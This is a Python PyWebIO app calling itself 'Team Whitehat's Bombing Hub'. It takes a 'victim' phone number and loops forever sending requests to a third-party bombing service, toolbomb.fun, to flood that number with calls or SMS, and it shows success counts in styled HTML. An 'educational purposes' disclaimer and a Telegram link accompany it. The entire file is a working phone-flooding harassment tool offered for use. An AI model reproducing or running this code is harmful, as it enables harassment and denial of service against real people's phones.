import pywebio.output as output
import pywebio.input as input
import requests
import time

count = {}

def scroll():
    output.put_html('<script>window.scrollTo(0, document.body.scrollHeight);</script>')

def MyApp():
    output.put_html('<div style="position: fixed; bottom: 113px; right: 10px; cursor: pointer; text-align: center;">' +
                    '<a href="https://t.me/Team_whitehat" target="_blank" style="text-decoration: none; color: transparent; -webkit-background-clip: text; background-image: linear-gradient(45deg, #f9ca24, #e74c3c, #3498db, #2ecc71, #9b59b6, #e67e22, #27ae60); background-size: 400% 400%; animation: glowAnimation 12s infinite;">' +
                    '<img src="https://iili.io/JSAfK2p.md.jpg/png-clipart-telegram-logo-computer-icons-others-miscellaneous-blue.png" alt="Telegram Logo" style="width: 51px; height: 50px; border-radius: 50%;"></a>' +
                    '</div>'
                    '<style>'
                    )
    output.put_html('<div style="text-align: center; font-size: 0.9em; font-family: \'Pacifico\', cursive; color: transparent; -webkit-background-clip: text; background-image: linear-gradient(45deg, #f9ca24, #e74c3c, #3498db, #2ecc71, #9b59b6, #e67e22, #27ae60); background-size: 600% 600%; animation: glowAnimation 12s infinite; -webkit-text-stroke: 1px black;">'
                '<h1>Welcome to Team Whitehat\'s Bombing Hub!</h1></div>'
                '<style>'
                '@keyframes glowAnimation {'
                '0% { background-position: 0% 50%; }'
                '50% { background-position: 100% 50%; }'
                '100% { background-position: 0% 50%; }'
                '</style>'
                '<style>'
                '@keyframes colorAnimation {'
                '0% { color: #e74c3c; }'
                '10% { color: #f39c12; }'
                '20% { color: #3498db; }'
                '30% { color: #2ecc71; }'
                '40% { color: #9b59b6; }'
                '50% { color: #e67e22; }'
                '60% { color: #27ae60; }'
                '70% { color: #e74c3c; }'
                '80% { color: #f39c12; }'
                '90% { color: #2ecc71; }'
                '100% { color: #3498db; }'
                '</style>'
                )
    output.put_html(f'<div class="ribbon">This is only for educational purposes or fun purpose,if anything will happen I am not responsible,use on your own risk it may damage your phone.</div>'
                    '<style>'
                    '.ribbon {'
                    'position: fixed;'
                    'bottom: 10px;'
                    'right: 10px;'
                    'background-image: linear-gradient(45deg, #f9ca24, #e74c3c);'
                    'color: white;'
                    'padding: 10px;'
                    'border-radius: 20px;'
                    'animation: ribbonFlow 15s infinite linear;'
                    'font-weight: bold;'
                    'white-space: nowrap;'
                    '}'
                    '@keyframes ribbonFlow {'
                    '0% { transform: translateX(100%); }'
                    '100% { transform: translateX(-100%); }'
                    '}'
                    '</style>')
                    
    mm = input.input_group('This Are Our Collection', [
        input.radio('Choose What You Want:', options=['Call Bomber', 'Sms Bomber'], name='meth')
    ])

    method = mm['meth']

    if method == 'Call Bomber':
        skc = input.input_group('• Call Bomber By: Team Whitehat 💸', [input.input(" • Enter Victim Number (without +91) ", name="SK")])
        SK = str(skc["SK"])
        if SK not in count:
            count[SK] = {"successful": 0, "failed": 0}
        else:
            count[SK]["successful"] = 0
            count[SK]["failed"] = 0
        while True:
            u=requests.get("https://api.toolbomb.fun/call.php?number={SK}&key=Madhav")
            url=requests.post(f"http://toolbomb.fun/Call-Bomber/", data={"number": SK, "key": "@Toolbomb", "sub": ""})
            urll=requests.post(f"http://toolbomb.fun/Call-Bomber/", data={"number": SK, "key": "@Toolbomb", "sub": ""})
            urlll=requests.post(f"http://toolbomb.fun/Call-Bomber/", data={"number": SK, "key": "@Toolbomb", "sub": ""}).status_code
            if urlll == 200:
                count[SK]["successful"] += 1
                output.put_html(
                    f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Call Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[SK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">Team Whitehat</span></i>')
                scroll()
                time.sleep(0.1)
            else:
                count[SK]["failed"] += 1
                output.put_html(
                    f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Call Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[SK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">Team Whitehat</span></i>')
                scroll()
                time.sleep(0.1)

    elif method == 'Sms Bomber':
        skc = input.input_group('• Sms Bomber By: Team Whitehat 💸', [input.input(" • Enter Victim Number (without +91) ", name="JK")])
        JK = str(skc["JK"])
        if JK not in count:
            count[JK] = {"successful": 0, "failed": 0}
        else:
            count[JK]["successful"] = 0
            count[JK]["failed"] = 0
        while True:
            u=requests.get("https://api.toolbomb.fun/call.php?number={JK}&key=Madhav")
            url=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""})
            urll=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""})
            urlll=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""}).status_code
            if urlll == 200:
                count[JK]["successful"] += 1
                output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Sms Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[JK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">Team Whitehat</span></i>')
                scroll()
                time.sleep(0.1)
            else:
                count[JK]["failed"] += 1
                output.put_html(f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Sms Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[JK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">Team Whitehat</span></i>')
                scroll()
                time.sleep(0.1)                 
if __name__ == '__main__':
    from pywebio import start_server
    start_server(MyApp, port=8086, debug=True)
